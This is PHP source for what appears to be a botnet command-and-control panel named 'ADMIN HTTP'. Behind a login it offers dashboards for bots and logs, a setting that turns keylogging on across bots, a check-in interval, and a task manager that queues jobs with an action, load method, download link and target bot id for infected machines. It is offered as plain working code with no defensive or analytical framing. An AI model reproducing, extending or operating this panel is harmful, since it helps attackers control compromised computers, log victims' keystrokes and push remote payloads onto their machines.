<?php
session_start();
include_once("config.php");
include_once("funcs.php");
include_once("db_req.php");
check_user_logged_or_login();

if(isset($_GET["logout"]))
{
    session_destroy();
    header("Location: login.php");
    exit();
}
if(isset($_GET["hide_task"]))
{
    $a = (int)$_GET["hide_task"];

        $db = new db_req;
        if($db->connect())
        {
            $db->hide_task_bot($a);
        }

    header("Location: page.php");
    exit();
}
if(isset($_GET["cf-save"]))
{
    $db = new db_req;
    if($db->connect())
    {
        $interval = (int)$_GET["cf-bots-interval"];
        $klog = $_GET["cf-keylog-enabled"] == "on" ? 1 : 0;
        $db->sql_update_safe("UPDATE `config` SET `bots_interval` = $interval, `keylog_enabled` = $klog");
    }
    header("Location: page.php");
    exit();
}
if(isset($_POST) && count($_POST))
{
    if(isset($_POST["tm-nt-create"]))
    {
        $db = new db_req;
        if($db->connect())
        {
            $_SESSION["nav"] = REQUEST_TASK_MAN;
            $db->create_task(
                $_POST["tm-nt-name"], 
                $_POST["tm-nt-action"], 
                $_POST["tm-nt-ldmethod"], 
                $_POST["tm-nt-link"], 
                $_POST["tm-nt-targetid"],
                $_POST["tm-nt-maxexecution"]);
        }
    }
    header("Location: page.php");
    exit();
}

$usernav = isset($_SESSION["nav"]) ? $_SESSION["nav"] : REQUEST_DASHBOARD;

?>
<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    
    <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <link href="css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="css/jquery-jvectormap-2.0.3.css" rel="stylesheet" type="text/css">
    <link href="css/theme.css" rel="stylesheet" type="text/css">

    <script src="js/jquery-3.2.1.min.js" type="text/javascript"></script>
    <script src="js/bootstrap.min.js" type="text/javascript"></script>
    <script src="js/jquery-jvectormap-2.0.3.min.js" type="text/javascript"></script>
    <script src="js/jquery-jvectormap-world-mill.js" type="text/javascript"></script>
    <script src="js/theme.js" type="text/javascript"></script>

    <script type="text/javascript">

        function req_page(id) {
            $.get("req.php?reqt=" + id, function (data, status) {
                if (status == "success")
                {
                    $("#id-page-content").html(data);
                    $("#ul-navbar-selection > li.active").removeClass("active");
                    document.getElementById("li-navbar-" + id).className = "active";
                }
            }
            );
            return false;
        }

        window.onload = function () {
            req_page(<?php echo $usernav; ?>);
        }
    </script>
</head>
<body>
    <nav class="navbar navbar-inverse">
        <div class="container-fluid">
            <div class="navbar-header">
                <a onclick="req_page(<?php echo REQUEST_DASHBOARD; ?>);" href="javascript:void(0);" class="navbar-brand">ADMIN HTTP</a>
            </div>
            <ul id="ul-navbar-selection" class="nav navbar-nav">
                <li id="li-navbar-<?php echo REQUEST_DASHBOARD; ?>" class="active">
                    <a onclick="req_page(<?php echo REQUEST_DASHBOARD; ?>);" href="javascript:void(0);"><i class="fa fa-dashboard"></i> Dashboard</a>
                </li>
                <li id="li-navbar-<?php echo REQUEST_BOTS; ?>">
                    <a onclick="req_page(<?php echo REQUEST_BOTS; ?>);" href="javascript:void(0);"><i class="fa fa-user"></i> Bots</a>
                </li>
                <li id="li-navbar-<?php echo REQUEST_LOGS; ?>">
                    <a onclick="req_page(<?php echo REQUEST_LOGS; ?>);" href="javascript:void(0);"><i class="fa fa-database"></i> Logs</a>
                </li>
                <li id="li-navbar-<?php echo REQUEST_TASK_MAN; ?>">
                    <a onclick="req_page(<?php echo REQUEST_TASK_MAN; ?>);" href="javascript:void(0);"><i class="fa fa-tasks"></i> Task Manager</a>
                </li>
                <li id="li-navbar-<?php echo REQUEST_CONFIG; ?>">
                    <a onclick="req_page(<?php echo REQUEST_CONFIG; ?>);" href="javascript:void(0);"><i class="fa fa-cogs"></i> Configuration</a>
                </li>
                <li>
                    <a href="page.php?logout=1"><i class="fa fa-sign-out"></i> Logout</a>
                </li>
            </ul>
        </div>
    </nav>
    <div id="id-page-content" class="cpage-content">

    </div>
    <noscript>
        <style type="text/css">.cpage-content{display:none;}</style>
        <div class="container-fluid">
            JAVASCRIPT IS REQUIRED
        </div>
    </noscript>
</body>
</html>

